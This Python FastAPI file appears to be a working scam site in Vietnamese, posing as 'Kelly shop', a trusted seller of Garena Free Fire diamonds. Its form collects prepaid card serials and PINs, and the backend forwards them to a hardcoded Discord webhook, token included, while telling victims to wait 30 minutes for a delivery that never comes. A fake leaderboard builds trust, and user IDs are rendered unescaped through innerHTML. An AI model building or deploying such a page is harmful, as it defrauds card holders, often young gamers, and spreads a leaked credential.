import os
import requests
from datetime import datetime, timedelta
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from supabase import create_client, Client

app = FastAPI()

# ---------------- CONFIGURATION ----------------
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542472440440160307/dmEza6iLQvY2lXjtHgvM-SAyCTHeNh0Rlib8FxNRSxlxyaGbqkdmGMPZewkt7e21X2br"

SUPABASE_URL = os.environ.get("SUPABASE_URL", "YOUR_SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "YOUR_SUPABASE_KEY")

supabase: Client = None
if SUPABASE_URL != "YOUR_SUPABASE_URL" and SUPABASE_KEY != "YOUR_SUPABASE_KEY":
    try:
        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
    except Exception as e:
        print("Lỗi kết nối Supabase:", e)

# ---------------- MODELS ----------------
class CardRequest(BaseModel):
    user_id: str
    amount: str
    diamonds: str
    card_type: str
    serial: str
    pin: str

# ---------------- API ENDPOINTS ----------------
@app.post("/api/verify-card")
async def verify_card(data: CardRequest):
    if len(data.serial) < 6 or len(data.pin) < 6:
        raise HTTPException(status_code=400, detail="thẻ đã sai,vui lòng kiểm tra lại")
    
    content = (
        f"**Đã có người nạp thẻ cào thành công**\n"
        f"**ID:** `{data.user_id}`\n"
        f"**Loại card:** `{data.card_type}`\n"
        f"**Mệnh giá:** `{data.amount}` ({data.diamonds})\n"
        f"**Seri:** `{data.serial}`\n"
        f"**Mã:** `{data.pin}`"
    )
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"content": content})
    except Exception as e:
        print("Webhook Error:", e)

    if supabase:
        try:
            supabase.table("recharge_history").insert({
                "user_id": data.user_id,
                "amount": data.amount,
                "diamonds": data.diamonds
            }).execute()
        except Exception as e:
            print("Supabase Insert Error:", e)

    return {"message": "đã nạp thành công vui lòng chờ 30 phút để nhận thẻ"}

@app.get("/api/history")
async def get_history():
    if not supabase:
        return {"history": [], "top": []}
    
    try:
        ten_mins_ago = (datetime.utcnow() - timedelta(minutes=10)).isoformat()
        history_res = supabase.table("recharge_history").select("*").gte("created_at", ten_mins_ago).order("created_at", desc=True).execute()
        top_res = supabase.table("recharge_history").select("user_id, amount").order("created_at", desc=True).limit(5).execute()
        
        return {
            "history": history_res.data if history_res.data else [],
            "top": top_res.data if top_res.data else []
        }
    except Exception as e:
        print("Supabase Fetch Error:", e)
        return {"history": [], "top": []}

# ---------------- FRONTEND INTERFACE ----------------
@app.get("/", response_class=HTMLResponse)
async def serve_home():
    return """
    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Kelly shop - Nạp KC Garena Uy Tín</title>
        <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
        <style>
            * { box-sizing: border-box; }
            body { 
                font-family: 'Plus Jakarta Sans', sans-serif; 
                background-color: #f4f6f9; 
                color: #1a1d20; 
                margin: 0; 
                padding: 0; 
                text-align: center;
            }
            header { 
                background: #ffffff; 
                padding: 18px 24px; 
                display: flex; 
                justify-content: space-between; 
                align-items: center; 
                position: sticky; 
                top: 0; 
                z-index: 100; 
                box-shadow: 0 4px 20px rgba(0,0,0,0.05); 
                border-bottom: 1px solid #eaeaea;
            }
            .brand-title {
                margin: 0; 
                font-size: 20px; 
                font-weight: 800; 
                color: #0066ff;
                letter-spacing: -0.5px;
            }
            .menu-btn { 
                font-size: 26px; 
                cursor: pointer; 
                background: none; 
                border: none; 
                color: #1a1d20; 
            }
            .side-menu { 
                display: none; 
                position: fixed; 
                top: 65px; 
                left: 0; 
                width: 280px; 
                background: #ffffff; 
                height: 100%; 
                border-right: 1px solid #e0e0e0; 
                text-align: left; 
                padding: 20px; 
                z-index: 99;
                box-shadow: 4px 0 15px rgba(0,0,0,0.05);
            }
            .side-menu a { 
                display: block; 
                color: #333333; 
                padding: 14px 12px; 
                text-decoration: none; 
                border-bottom: 1px solid #f0f0f0; 
                font-weight: 600; 
                font-size: 16px;
                border-radius: 8px;
            }
            .side-menu a:hover {
                background: #f0f4ff;
                color: #0066ff;
            }
            .banner-container {
                max-width: 680px;
                margin: 20px auto 0 auto;
                padding: 0 16px;
            }
            .banner { 
                width: 100%; 
                border-radius: 16px; 
                box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
            }
            .scroll-hint {
                color: #6c757d; 
                font-size: 15px; 
                margin: 15px 0 25px 0;
                font-weight: 500;
            }
            .container { 
                max-width: 680px; 
                margin: 0 auto 40px auto; 
                padding: 32px 28px; 
                background: #ffffff; 
                border-radius: 20px; 
                box-shadow: 0 10px 30px rgba(0,0,0,0.05); 
                border: 1px solid #eaeaea;
            }
            .badge-verified {
                display: inline-block;
                background: #e6f4ea;
                color: #137333;
                padding: 8px 16px;
                border-radius: 50px;
                font-weight: 700;
                font-size: 16px;
                margin-bottom: 24px;
            }
            .form-label {
                text-align: left; 
                font-weight: 700; 
                font-size: 15px; 
                color: #495057; 
                margin: 16px 0 8px 4px;
                display: block;
            }
            select, input { 
                width: 100%; 
                padding: 16px; 
                margin-bottom: 12px; 
                background: #f8f9fa; 
                border: 2px solid #e9ecef; 
                color: #1a1d20; 
                border-radius: 12px; 
                font-size: 16px; 
                font-weight: 600;
                outline: none; 
                transition: all 0.2s ease;
                font-family: inherit;
            }
            select:focus, input:focus {
                border-color: #0066ff;
                background: #ffffff;
                box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.1);
            }
            .btn { 
                background: #0066ff; 
                color: white; 
                padding: 18px; 
                border: none; 
                border-radius: 12px; 
                cursor: pointer; 
                font-weight: 700; 
                width: 100%; 
                font-size: 18px; 
                margin-top: 10px;
                box-shadow: 0 8px 20px rgba(0, 102, 255, 0.25);
                transition: all 0.2s ease;
            }
            .btn:hover {
                background: #0052cc;
                transform: translateY(-2px);
            }
            .btn-red { 
                background: #ff3b30; 
                display: none; 
                box-shadow: 0 8px 20px rgba(255, 59, 48, 0.25);
            }
            .btn-red:hover {
                background: #d63027;
            }
            .modal { 
                display: none; 
                position: fixed; 
                top: 0; 
                left: 0; 
                width: 100%; 
                height: 100%; 
                background: rgba(0,0,0,0.4); 
                backdrop-filter: blur(4px);
                justify-content: center; 
                align-items: center; 
                z-index: 200; 
            }
            .modal-content { 
                background: #ffffff; 
                padding: 32px; 
                border-radius: 20px; 
                width: 90%; 
                max-width: 400px; 
                text-align: center; 
                box-shadow: 0 20px 40px rgba(0,0,0,0.15);
            }
            .modal-btns { 
                display: flex; 
                gap: 12px; 
                margin-top: 24px; 
            }
            .btn-close { 
                background: #f1f3f5; 
                color: #495057; 
                box-shadow: none;
            }
            .btn-close:hover { background: #e9ecef; }
            .btn-confirm { 
                background: #ff3b30; 
                box-shadow: 0 4px 15px rgba(255, 59, 48, 0.3);
            }
            .page { display: none; }
            .active { display: block; }
            ul { list-style: none; padding: 0; margin: 0; }
            li { 
                background: #f8f9fa; 
                margin: 10px 0; 
                padding: 16px; 
                border-radius: 12px; 
                font-size: 15px; 
                font-weight: 600;
                text-align: left;
                border: 1px solid #f0f0f0;
            }
        </style>
    </head>
    <body>

        <header>
            <button class="menu-btn" onclick="toggleMenu()">☰</button>
            <h3 class="brand-title">Kelly shop - Nạp KC Garena Uy Tín</h3>
        </header>

        <div id="sideMenu" class="side-menu">
            <a href="#" onclick="showPage('home')">Trang chủ (Nạp thẻ)</a>
            <a href="#" onclick="showPage('history')">Lịch sử & Top nạp</a>
        </div>

        <!-- TRANG CHỦ -->
        <div id="home" class="page active">
            <div class="banner-container">
                <img src="https://i.postimg.cc/k5TS6ZXp/IMG-20260827-163058.jpg" class="banner" alt="Poster Web">
                <p class="scroll-hint"><i>Lướt xuống để tiếp tục</i></p>
            </div>

            <div class="container">
                <span class="badge-verified">[Nạp KC - Uy Tín ✓]</span>
                
                <span class="form-label">Tài khoản Game:</span>
                <input type="text" id="userId" placeholder="Nhập ID tài khoản Free Fire...">
                
                <span class="form-label">Chọn gói nạp:</span>
                <select id="packageSelect" onchange="enableContinue()">
                    <option value="">-- Bấm vào đây để chọn gói --</option>
                    <option value="50k|20k 💎">50K - 20k 💎</option>
                    <option value="100k|70k 💎">100k - 70k 💎</option>
                    <option value="200k|160k 💎">200k - 160k 💎</option>
                    <option value="500k|500k 💎">500k - 500k 💎</option>
                    <option value="1tr|1.200.000 💎">1tr - 1.200.000 kc 💎</option>
                </select>

                <button id="continueBtn" class="btn btn-red" onclick="goToPayment()">Tiếp tục</button>
            </div>
        </div>

        <!-- TRANG THANH TOÁN -->
        <div id="payment" class="page">
            <div class="banner-container">
                <img src="https://symbols.vn/wp-content/uploads/2022/09/Kim-cuong-Free-Fire.jpg" class="banner" alt="Payment Poster">
            </div>
            
            <div class="container" style="margin-top: 25px;">
                <h2 id="payAmountText" style="color: #0066ff; margin-bottom: 25px; font-size: 24px;">Số tiền cần thanh toán: 0đ</h2>
                <button class="btn" onclick="showCardMenu()">Thanh toán</button>
            </div>
        </div>

        <!-- TRANG NHẬP CARD -->
        <div id="cardMenu" class="page">
            <div class="container" style="margin-top: 30px;">
                <h2 style="margin-top:0; font-size: 24px;">Thông Tin Thẻ Cào</h2>
                
                <span class="form-label">Loại thẻ:</span>
                <select id="cardType">
                    <option value="">-- Chọn loại thẻ --</option>
                    <option value="Viettel">Viettel</option>
                    <option value="VinaPhone">VinaPhone</option>
                    <option value="MobiFone">MobiFone</option>
                    <option value="Garena">Garena</option>
                    <option value="Zing">Zing (VNG)</option>
                    <option value="Gate">Gate</option>
                    <option value="Vcoin">Vcoin (VTC)</option>
                    <option value="Appota">Appota</option>
                </select>
                
                <span class="form-label">Số Seri:</span>
                <input type="text" id="cardSerial" placeholder="Nhập số Seri in trên thẻ...">
                
                <span class="form-label">Mã Thẻ:</span>
                <input type="text" id="cardPin" placeholder="Cào lớp bạc và nhập mã thẻ...">
                
                <button class="btn" onclick="openConfirmModal()">Thanh toán</button>
            </div>
        </div>

        <!-- TRANG LỊCH SỬ & TOP -->
        <div id="history" class="page">
            <div class="container" style="margin-top: 30px;">
                <h3 style="color: #ff9500; text-align: left; font-size: 18px; margin-top:0;">Lịch Sử Nạp Gần Đây (Tự xóa sau 10p)</h3>
                <ul id="historyList"></ul>
                
                <hr style="border: 0; border-top: 1px solid #eaeaea; margin: 30px 0;">
                
                <h3 style="color: #0066ff; text-align: left; font-size: 18px;">Top Nạp Thẻ Nhất</h3>
                <ul id="topList"></ul>
            </div>
        </div>

        <!-- MODAL XÁC NHẬN -->
        <div id="confirmModal" class="modal">
            <div class="modal-content">
                <h3 style="margin-top:0; font-size: 20px;">Xác nhận thanh toán</h3>
                <p style="color: #6c757d; font-size: 15px;">Bạn có chắc chắn muốn gửi thông tin thẻ này để thanh toán không?</p>
                <div class="modal-btns">
                    <button class="btn btn-close" onclick="closeConfirmModal()">Đóng</button>
                    <button class="btn btn-confirm" onclick="processPayment()">Xác nhận</button>
                </div>
            </div>
        </div>

        <script>
            let selectedAmount = "", selectedDiamonds = "";

            function toggleMenu() {
                const menu = document.getElementById('sideMenu');
                menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
            }

            function showPage(pageId) {
                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
                document.getElementById(pageId).classList.add('active');
                document.getElementById('sideMenu').style.display = 'none';
                if(pageId === 'history') loadHistory();
            }

            function enableContinue() {
                const val = document.getElementById('packageSelect').value;
                document.getElementById('continueBtn').style.display = val ? 'inline-block' : 'none';
            }

            function goToPayment() {
                const userId = document.getElementById('userId').value;
                if(!userId) { alert("Vui lòng nhập ID tài khoản!"); return; }
                
                const val = document.getElementById('packageSelect').value.split('|');
                selectedAmount = val[0];
                selectedDiamonds = val[1];

                document.getElementById('payAmountText').innerText = "Số tiền cần thanh toán: " + selectedAmount;
                showPage('payment');
            }

            function showCardMenu() { showPage('cardMenu'); }
            function openConfirmModal() { 
                const cardType = document.getElementById('cardType').value;
                if(!cardType) { alert("Vui lòng chọn loại thẻ!"); return; }
                document.getElementById('confirmModal').style.display = 'flex'; 
            }
            function closeConfirmModal() { document.getElementById('confirmModal').style.display = 'none'; }

            async function processPayment() {
                closeConfirmModal();
                const userId = document.getElementById('userId').value;
                const cardType = document.getElementById('cardType').value;
                const serial = document.getElementById('cardSerial').value;
                const pin = document.getElementById('cardPin').value;

                if(!serial || !pin) {
                    alert("thẻ đã sai,vui lòng kiểm tra lại");
                    return;
                }

                const res = await fetch('/api/verify-card', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        user_id: userId,
                        amount: selectedAmount,
                        diamonds: selectedDiamonds,
                        card_type: cardType,
                        serial: serial,
                        pin: pin
                    })
                });

                const result = await res.json();
                if(res.ok) {
                    alert(result.message);
                    showPage('home');
                } else {
                    alert(result.detail);
                }
            }

            async function loadHistory() {
                const res = await fetch('/api/history');
                const data = await res.json();
                
                const hList = document.getElementById('historyList');
                hList.innerHTML = data.history.length ? "" : "<li>Chưa có giao dịch gần đây.</li>";
                data.history.forEach(item => {
                    hList.innerHTML += `<li>ID: <b>${item.user_id}</b> - Gói: ${item.amount} (${item.diamonds})</li>`;
                });

                const tList = document.getElementById('topList');
                tList.innerHTML = data.top.length ? "" : "<li>Bảng xếp hạng trống.</li>";
                data.top.forEach(item => {
                    tList.innerHTML += `<li>ID: <b>${item.user_id}</b> - Đã nạp: ${item.amount}</li>`;
                });
            }
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
            
